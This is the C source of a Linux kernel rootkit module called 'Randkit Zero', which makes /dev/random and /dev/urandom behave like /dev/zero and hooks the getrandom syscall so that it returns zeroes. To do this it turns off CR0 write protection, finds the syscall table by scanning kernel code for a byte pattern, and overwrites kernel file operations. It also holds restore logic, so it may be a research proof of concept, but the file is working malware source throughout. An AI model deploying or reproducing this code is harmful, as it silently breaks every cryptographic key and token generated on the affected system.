#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/uaccess.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Vincent Rasneur <vrasneur@free.fr>");
MODULE_DESCRIPTION("Randkit Zero: replaces /dev/(u)random with /dev/zero");

static struct file_operations *urandom_fops_ptr;
static struct file_operations *random_fops_ptr;
static struct file_operations *zero_fops_ptr;

static struct file_operations saved_urandom_fops;
static struct file_operations saved_random_fops;

typedef long (*rk_sys_getrandom_fun)(char __user *, size_t, unsigned int);

static void **saved_syscall_table;
static rk_sys_getrandom_fun saved_sys_getrandom;

// read/write protection, adapted from grsecurity

static inline unsigned long rk_disable_wp(void)
{
    unsigned long cr0;
  
    preempt_disable();

    barrier();
    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    barrier();

    return cr0;
}

static inline void rk_enable_wp(unsigned long cr0)
{
    barrier();
    write_cr0(cr0);
    barrier();
  
    preempt_enable();
}

#define RK_DISABLE_WP				\
  {						\
  unsigned long _rk_cr0;			\
  _rk_cr0 = rk_disable_wp();

#define RK_ENABLE_WP				\
  rk_enable_wp(_rk_cr0);			\
  }

static struct file_operations *rk_get_fops(int minor)
{
    struct inode inode;
    struct file fp;
    struct address_space mapping;
  
    memset(&inode, 0, sizeof(inode));
    // chrdev_open needs a doubly linked list here
    INIT_LIST_HEAD(&inode.i_devices);
    // get a pointer to chrdev_open
    init_special_inode(&inode, S_IFCHR, MKDEV(1, minor));

    memset(&fp, 0, sizeof(fp));
    memset(&mapping, 0, sizeof(mapping));
    // memory_open (called by chrdev_open)
    // needs the f_mapping pointer on old 3.x kernels
    fp.f_mapping = &mapping;
  
    // inode.i_fop->open == chrdev_open
    inode.i_fop->open(&inode, &fp);

    // for urandom, fp.f_op->read is urandom_read
    printk(KERN_INFO "read fops is at: %p\n", (void *)fp.f_op->read);

    list_del(&inode.i_devices);
  
    // remove the const correctness
    return (struct file_operations *)fp.f_op;
}

static void const *rk_memmem(void const *haystack, size_t hl,
                             void const *needle, size_t nl)
{
    void const *res = NULL;

    if(nl <= hl) {
        int idx = 0;
        char const *buf = haystack;
      
        for(idx = 0; idx <= hl - nl; idx++) {
            if(memcmp(buf, needle, nl) == 0) {
                res = buf;
                break;
            }

            buf++;
        }
    }
  
    return res;
}

static void **rk_find_syscall_table(void)
{
#define OFFSET_SYSCALL 256
    void **syscall_table = NULL;
    unsigned long syscall_entry;
    char const *buf = NULL;
    
    // get the entry_SYSCALL_64 address
    rdmsrl(MSR_LSTAR, syscall_entry);
    // find the sys_call_table reference in the code
    buf = rk_memmem((void const *)syscall_entry, OFFSET_SYSCALL, "\xff\x14\xc5", 3);
    if(buf != NULL)
    {
        // convert to pointer
        unsigned long ptr = *(unsigned long *)(buf + 3);
        syscall_table = (void **)(0xFFFFFFFF00000000 | ptr);
    }
    
    return syscall_table;
}

static void rk_patch_fops(void)
{
    printk(KERN_INFO "saving random fops\n");
    
    urandom_fops_ptr = rk_get_fops(9);
    random_fops_ptr = rk_get_fops(8);
    zero_fops_ptr = rk_get_fops(5);

    saved_urandom_fops = *urandom_fops_ptr;
    saved_random_fops = *random_fops_ptr;
    
    printk(KERN_INFO "patching random fops\n");
  
    RK_DISABLE_WP
    *urandom_fops_ptr = *zero_fops_ptr;
    *random_fops_ptr = *zero_fops_ptr;
    RK_ENABLE_WP

    printk(KERN_INFO "patching done\n");
}

static asmlinkage long rk_sys_getrandom(char __user * buf, size_t count, unsigned int flags)
{
    if(clear_user(buf, count) != 0) {
        return -1;
    }

    return (long)count;
}

static void rk_patch_getrandom(void)
{
#ifdef __NR_getrandom
    saved_syscall_table = rk_find_syscall_table();

    if(saved_syscall_table != NULL)
    {
        printk(KERN_INFO "found syscall table at: %p\n", saved_syscall_table);

        printk(KERN_INFO "saving getrandom syscall\n");

        saved_sys_getrandom = (rk_sys_getrandom_fun)saved_syscall_table[__NR_getrandom];

        printk(KERN_INFO "overwriting getrandom syscall\n");
        
        RK_DISABLE_WP
        saved_syscall_table[__NR_getrandom] = (void *)rk_sys_getrandom;
        RK_ENABLE_WP

        printk(KERN_INFO "overwriting done\n");
    }
#endif // __NR_getrandom
}

static int __init rk_init(void)
{
    rk_patch_fops();
    rk_patch_getrandom();

    return 0;
}

static void rk_restore_fops(void)
{
    printk(KERN_INFO "restoring random fops\n");

    RK_DISABLE_WP
    *urandom_fops_ptr = saved_urandom_fops;
    *random_fops_ptr = saved_random_fops;
    RK_ENABLE_WP

    printk(KERN_INFO "restoring done\n");
}

static void rk_restore_getrandom(void)
{
#ifdef __NR_getrandom
    if(saved_syscall_table != NULL && saved_sys_getrandom != NULL)
    {
        printk(KERN_INFO "restoring getrandom syscall\n");
        
        RK_DISABLE_WP
        saved_syscall_table[__NR_getrandom] = (void *)saved_sys_getrandom;
        RK_ENABLE_WP

        printk(KERN_INFO "restoring done\n");
    }    
#endif
}

static void __exit rk_cleanup(void)
{
    rk_restore_fops();
    rk_restore_getrandom();
}

module_init(rk_init);
module_exit(rk_cleanup);
